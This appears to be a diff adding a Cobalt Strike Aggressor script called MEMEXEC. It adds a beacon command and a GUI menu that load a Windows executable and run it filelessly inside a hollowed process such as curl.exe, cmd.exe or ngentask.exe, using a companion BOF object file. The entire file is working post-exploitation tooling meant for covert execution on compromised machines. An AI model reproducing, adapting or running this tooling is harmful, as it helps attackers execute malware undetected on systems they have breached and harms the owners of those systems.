@@ -1,0 +1,176 @@
+alias memexec {
+    local('$bid $pe_path $target $params $pe_handle $pe_data $bof_handle $bof_data $args $pe_size $capture');
+
+    $bid = $1;
+    $pe_path = $2;
+    $target = $3;
+    $params = $4;
+
+    $capture = 0;
+    if ($5 ne $null && strlen($5) > 0 && $5 eq "1") {
+        $capture = 1;
+    }
+
+    if (!$pe_path || !$target) {
+        berror($bid, "Usage: memexec <pe_file> <target_process> [params] [capture]");
+        berror($bid, "  capture: 0 = detached (default), 1 = stream PE output to beacon");
+        return;
+    }
+
+    if (!$params) { $params = ""; }
+
+    if (!-exists $pe_path) {
+        berror($bid, "PE file not found: $pe_path");
+        return;
+    }
+
+    $pe_handle = openf($pe_path);
+    if ($pe_handle is $null) {
+        berror($bid, "Failed to open PE file: $pe_path");
+        return;
+    }
+    $pe_data = readb($pe_handle, -1);
+    closef($pe_handle);
+
+    $pe_size = strlen($pe_data);
+    if ($pe_size == 0) {
+        berror($bid, "PE file is empty: $pe_path");
+        return;
+    }
+
+    $bof_handle = openf(script_resource("memexec.o"));
+    if (!$bof_handle) {
+        $bof_handle = openf(script_resource("bof.o"));
+    }
+    if (!$bof_handle) {
+        berror($bid, "BOF not found: memexec.o (place next to this .cna)");
+        return;
+    }
+    $bof_data = readb($bof_handle, -1);
+    closef($bof_handle);
+
+    blog($bid, "[*] MEMEXEC - By WeedPeddler");
+    blog($bid, "[*] PE Size : $pe_size bytes");
+    blog($bid, "[*] Target  : $target");
+    blog($bid, "[*] Executing PE in-memory...");
+
+    $args = bof_pack($bid, "bzzi", $pe_data, $target, $params, $capture);
+    beacon_inline_execute($bid, $bof_data, "go", $args);
+}
+
+popup beacon_bottom {
+    menu "MEMEXEC" {
+        item "Load PE In-Memory" {
+            local('$dialog $selected_bids');
+            $selected_bids = $1;
+
+            $dialog = dialog("MEMEXEC - By WeedPeddler",
+                %(
+                    pe_file        => "",
+                    target_mode    => "Native x64",
+                    target_process => "",
+                    parameters     => "",
+                    stdio_mode     => "Capture Output (Always)"
+                ),
+                lambda({
+                    local('$pe $mode $tgt $prm $bid $pe_handle $pe_data $bof_handle $bof_data $args $pe_size $capture');
+
+                    $pe   = $3['pe_file'];
+                    $mode = $3['target_mode'];
+                    $tgt  = $3['target_process'];
+                    $prm  = $3['parameters'];
+
+                    if (strlen($pe) == 0) {
+                        show_error("PE file path is required!");
+                        return;
+                    }
+
+                    if (!-exists $pe) {
+                        show_error("PE file not found: $pe");
+                        return;
+                    }
+
+                    if ($mode eq ".NET x64") {
+                        $tgt = 'C:\Windows\Microsoft.NET\Framework64\v4.0.30319\ngentask.exe';
+                    } else if ($mode eq ".NET x86") {
+                        $tgt = 'C:\Windows\Microsoft.NET\Framework\v4.0.30319\ngentask.exe';
+                    } else if ($mode eq "Native x64") {
+                        $tgt = 'C:\Windows\System32\curl.exe';
+                    } else if ($mode eq "Native x86") {
+                        $tgt = 'C:\Windows\SysWOW64\cmd.exe';
+                    } else {
+                        $tgt = $3['target_process'];
+                    }
+
+                    if (strlen($tgt) == 0) {
+                        show_error("Target process path is required!");
+                        return;
+                    }
+
+                    $pe_handle = openf($pe);
+                    if (!$pe_handle) {
+                        show_error("Failed to open PE file");
+                        return;
+                    }
+                    $pe_data = readb($pe_handle, -1);
+                    closef($pe_handle);
+
+                    $pe_size = strlen($pe_data);
+                    if ($pe_size == 0) {
+                        show_error("Failed to read PE file (empty)");
+                        return;
+                    }
+
+                    $bof_handle = openf(script_resource("memexec.o"));
+                    if (!$bof_handle) {
+                        $bof_handle = openf(script_resource("bof.o"));
+                    }
+                    if (!$bof_handle) {
+                        show_error("BOF not found: memexec.o\nPlace next to the .cna file.");
+                        return;
+                    }
+                    $bof_data = readb($bof_handle, -1);
+                    closef($bof_handle);
+
+                    if (!$prm) { $prm = ""; }
+
+                    $capture = 0;
+                    if ($3['stdio_mode'] eq "Capture Output (Always)") {
+                        $capture = 1;
+                    }
+
+                    foreach $bid ($selected_bids) {
+                        blog($bid, "[*] MEMEXEC - By WeedPeddler");
+                        blog($bid, "[*] PE Size : $pe_size bytes");
+                        blog($bid, "[*] Target  : $tgt");
+                        blog($bid, "[*] Mode    : $mode");
+                        blog($bid, "[*] Executing PE in-memory...");
+
+                        $args = bof_pack($bid, "bzzi", $pe_data, $tgt, $prm, $capture);
+                        beacon_inline_execute($bid, $bof_data, "go", $args);
+                    }
+                }, $selected_bids => $selected_bids));
+
+            drow_static($dialog, "Load and execute a Windows PE in-memory (fileless).");
+            drow_file($dialog, "pe_file", "PE file to execute:");
+            drow_combobox($dialog, "target_mode", "Hollowing target:", @("Native x64", "Native x86", ".NET x64", ".NET x86", "Custom path"));
+            drow_text($dialog, "target_process", "Custom target path (used when 'Custom path' is selected):");
+            drow_text($dialog, "parameters", "Arguments (optional):");
+            drow_combobox($dialog, "stdio_mode", "Console output:", @("Capture Output (Always)", "No Output (Fire And Forget)"));
+            dbutton_action($dialog, "Execute");
+            dialog_show($dialog);
+        }
+    }
+}
+
+beacon_command_register("memexec", "Load and execute a Windows PE in-memory (fileless)",
+    "Usage: memexec <pe_file> <target_process> [params] [capture]\n" .
+    "  capture: 0 = detached (default), 1 = stream PE output to beacon");
+
+println("+--------------------------------------------------------------+");
+println("|  MEMEXEC - By WeedPeddler                                        |");
+println("+--------------------------------------------------------------+");
+println("  Command : memexec <pe_file> <target_process> [params] [capture]");
+println("  GUI     : Right-click beacon -> MEMEXEC -> Load PE In-Memory");
+println("  BOF     : memexec.o (place next to this .cna)");
+println("+--------------------------------------------------------------+");
